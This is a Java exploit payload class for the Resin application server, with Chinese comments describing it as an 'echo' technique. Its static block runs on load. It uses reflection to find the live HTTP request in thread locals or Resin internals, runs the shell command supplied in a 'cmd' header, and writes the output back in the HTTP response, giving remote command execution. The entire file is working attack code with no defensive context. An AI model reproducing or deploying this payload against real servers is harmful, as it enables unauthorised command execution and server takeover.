package com.firebasky.exp;

/**
 * TargetObject = {com.caucho.env.thread2.ResinThread2}
 *   ---> threadLocals = {java.lang.ThreadLocal$ThreadLocalMap}
 *    ---> table = {class [Ljava.lang.ThreadLocal$ThreadLocalMap$Entry;}
 *     ---> [6] = {java.lang.ThreadLocal$ThreadLocalMap$Entry}
 *      ---> value = {com.caucho.server.http.HttpRequest}
 */

/**
 * resin 回显
 * 1.线程对象中request
 * 2.request对象存储在静态变量或者特定类里
 */
public class Echo_HttpRequest {
    static {
        try {
            getResponse();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    //线程对象中request
    public static void getResponse() throws Exception {
        Thread thread = Thread.currentThread();
        java.lang.reflect.Field threadLocals = Thread.class.getDeclaredField("threadLocals");
        threadLocals.setAccessible(true);
        Object threadLocalMap = threadLocals.get(thread);

        Class threadLocalMapClazz = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
        java.lang.reflect.Field  tableField = threadLocalMapClazz.getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] objects = (Object[]) tableField.get(threadLocalMap);

        Class entryClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
        java.lang.reflect.Field  entryValueField = entryClass.getDeclaredField("value");
        entryValueField.setAccessible(true);

        for (Object object : objects) {
            if (object != null) {
                Object valueObject = entryValueField.get(object);
                if (valueObject != null) {
                    if (valueObject.getClass().getName().equals("com.caucho.server.http.HttpRequest")) {
                        com.caucho.server.http.HttpRequest httpRequest = (com.caucho.server.http.HttpRequest)valueObject;
                        //执行命令
                        String cmd1 = httpRequest.getHeader("cmd");
                        String[] cmd = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", cmd1} : new String[]{"cmd.exe", "/c",cmd1};
                        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
                        java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                        String output = s.hasNext() ? s.next() : "";
                        //response
                        com.caucho.server.http.HttpResponse httpResponse = httpRequest.createResponse();
                        httpResponse.setHeader("Content-Length", output.length() + "");
                        java.lang.reflect.Method method = httpResponse.getClass().getDeclaredMethod("createResponseStream");
                        method.setAccessible(true);
                        com.caucho.server.http.HttpResponseStream httpResponseStream = (com.caucho.server.http.HttpResponseStream) method.invoke(httpResponse);
                        httpResponseStream.write(output.getBytes(), 0, output.length());
                        httpResponseStream.close();
                    }
                }
            }
        }
    }

    //request对象存储在静态变量或者特定类里
    public static void getResponse2() throws Exception {
        Class tcpsocketLinkClazz = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.network.listen.TcpSocketLink");
        java.lang.reflect.Method getCurrentRequestM = tcpsocketLinkClazz.getMethod("getCurrentRequest");
        Object currentRequest = getCurrentRequestM.invoke(null);
        java.lang.reflect.Field f = currentRequest.getClass().getSuperclass().getDeclaredField("_responseFacade");
        f.setAccessible(true);
        Object response = f.get(currentRequest);
        java.lang.reflect.Method getWriterM = response.getClass().getMethod("getWriter");
        java.io.PrintWriter w = ( java.io.PrintWriter) getWriterM.invoke(response);
        //response
        String[] cmd = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", "whoami"} : new String[]{"cmd.exe", "/c","whoami"};
        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
        java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
        String output = s.hasNext() ? s.next() : "";
        //输出
        w.write(output);
    }

    //request对象存储在静态变量或者特定类里
    public static void getResponse3() throws Exception {
        Class si = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
        java.lang.reflect.Method getContextRequest = si.getMethod("getContextRequest");
        com.caucho.server.http.HttpServletRequestImpl req = (com.caucho.server.http.HttpServletRequestImpl) getContextRequest.invoke(null);
        try {
            if (req.getHeader("cmd") != null) {
                String cmd = req.getHeader("cmd");
                javax.servlet.http.HttpServletResponse rep = (javax.servlet.http.HttpServletResponse) req.getServletResponse();
                java.io.PrintWriter out = rep.getWriter();
                out.println(new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
